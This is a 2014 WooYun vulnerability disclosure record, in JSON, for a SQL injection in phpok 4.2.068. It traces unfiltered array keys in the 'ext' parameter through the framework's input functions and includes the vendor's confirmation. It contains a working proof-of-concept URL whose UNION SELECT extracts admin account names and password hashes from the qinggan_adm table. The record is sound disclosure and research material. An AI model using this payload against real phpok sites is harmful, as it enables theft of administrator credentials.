{"id": 43347, "wybug_id": "wooyun-2014-083018", "wybug_title": "phpok4.2.068最新版SQL注射", "wybug_corp": "phpok.com", "wybug_author": "夕风号", "wybug_date": "2014-11-12 15:53", "wybug_open_date": "2015-02-10 15:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-01-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-10：\t细节向公众公开  简要描述： NULL 详细说明：  /framework/www/project_control.php\n...$ext = $this->get(\"ext\");...\t\tif($ext && is_array($ext))\t\t{\t\t\t$c = '';\t\t\tforeach($ext AS $key=>$value)\t\t\t{\t\t\t\tif($key && $value)\t\t\t\t{\t\t\t\t\t$c[] = \"ext.\".$key.\" LIKE '%\".$value.\"%'\";       //$key被带入SQL\t\t\t\t\t$pageurl .= \"ext[\".$key.\"]=\".rawurlencode($value).\"&\";\t\t\t\t}\t\t\t}\t\t\tif($c) $dt['sqlext'] = implode(\" AND \",$c);\t\t\t$this->assign('ext',$ext);\t\t}\n跟进get()/framework/init.php\nfunction get($id,$type=\"safe\",$ext=\"\")\t{\t\t$val = isset($_POST[$id]) ? $_POST[$id] : (isset($_GET[$id]) ? $_GET[$id] : \"\");\t\tif($val == '') return false;\t\t//判断内容是否有转义，所有未转义的数据都直接转义\t\t$addslashes = false;\t\tif(function_exists(\"get_magic_quotes_gpc\") && get_magic_quotes_gpc()) $addslashes = true;\t\tif(!$addslashes) $val = $this->_addslashes($val);\t\treturn $this->format($val,$type,$ext);\t}\n跟进format()\nfunction format($msg,$type=\"safe\",$ext=\"\")\t{\t\tif($msg == \"\") return false;\t\tif(is_array($msg))\t\t{\t\t\tforeach($msg AS $key=>$value)\t\t\t{\t\t\t\t$msg[$key] = $this->format($value,$type,$ext);\t\t\t}\t\t\treturn $msg;\t\t}\t\t//如果返回的是html\t\tif($type == 'html_js' || ($type == 'html' && $ext))\t\t{\t\t\t//去除编辑器里的绝对网址\t\t\t$msg = stripslashes($msg);\t\t\t$array = array(\"src='\".$this->url,'src=\"'.$this->url,\"src=\".$this->url);\t\t\t$new = array(\"src='\",'src=\"',\"src=\");\t\t\t$msg = str_replace($array,$new,$msg);\t\t\treturn addslashes($msg);\t\t}\t\t$msg = stripslashes($msg);\t\t//格式化处理内容\t\tswitch ($type)\t\t{\t\t\tcase 'safe':$msg = str_replace(array(\"\\\\\",\"'\",'\"',\"<\",\">\"),array(\"&#92;\",\"&#39;\",\"&quot;\",\"&lt;\",\"&gt;\"),$msg);break;\t\t\tcase 'system':$msg = !preg_match(\"/^[a-zA-Z][a-z0-9A-Z\\_\\-]+$/u\",$msg) ? false : $msg;break;\t\t\tcase 'id':$msg = !preg_match(\"/^[a-zA-Z][a-z0-9A-Z\\_\\-]+$/u\",$msg) ? false : $msg;break;\t\t\tcase 'checkbox':$msg = strtolower($msg) == 'on' ? 1 : $this->format($msg,'safe');break;\t\t\tcase 'int':$msg = intval($msg);break;\t\t\tcase 'intval':$msg = intval($msg);break;\t\t\tcase 'float':$msg = floatval($msg);break;\t\t\tcase 'floatval':$msg = floatval($msg);break;\t\t\tcase 'time':$msg = strtotime($msg);break;\t\t\tcase 'html':$msg = $this->safe_html($msg);break;\t\t\tcase 'func':$msg = function_exists($ext) ? $ext($msg) : false;break;\t\t}\t\tif($msg)\t\t{\t\t\t$msg = addslashes($msg);\t\t}\t\treturn $msg;\t}\n$msg为数组时，$key并未format()   漏洞证明：  \nhttp://localhost/phpok/index.php?c=project&id=product&ext[id%3D0%20union%20select%201%2C2%2C3%2C4%2C5%2C6%2Cconcat%28account%2C0x7c%2Cpass%29%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%20from%20qinggan_adm%23]=test\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 夕风号@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-11-12 16:01 厂商回复： 天啊，才刚刚发布，就又要逼我更新了~~吐一下啊还有啊，都是安全过滤的Bug，才发现真心好伤心啊！难道我写的系统有那么菜吗？ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}